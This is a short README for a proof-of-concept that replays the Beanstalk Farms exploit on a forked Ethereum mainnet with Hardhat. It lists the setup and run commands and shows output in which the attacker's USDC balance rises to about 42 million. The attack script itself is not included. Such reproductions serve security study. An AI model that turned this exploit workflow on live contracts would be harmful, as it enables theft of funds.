# Beanstalk Farms re-hack PoC

## How to run

Install nodejs/npm first

Set up the `forking url` (in `hardhat.config.ts`)

e.g. https://speedy-nodes-nyc.moralis.io/your-api-key/eth/mainnet/archive (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
npm install
npx hardhat run scripts/attack.ts
```
You will see similar output later
```
USDC balance of attacker: 0.0
Exploiting...
Exploit complete.
USDC balance of attacker: 42062065.615197
```
This means the attack is complete
> The block height of the fork is 14595905

## Link
* https://rekt.news/beanstalk-rekt/
* https://twitter.com/BlockSecTeam/status/1515732238612430849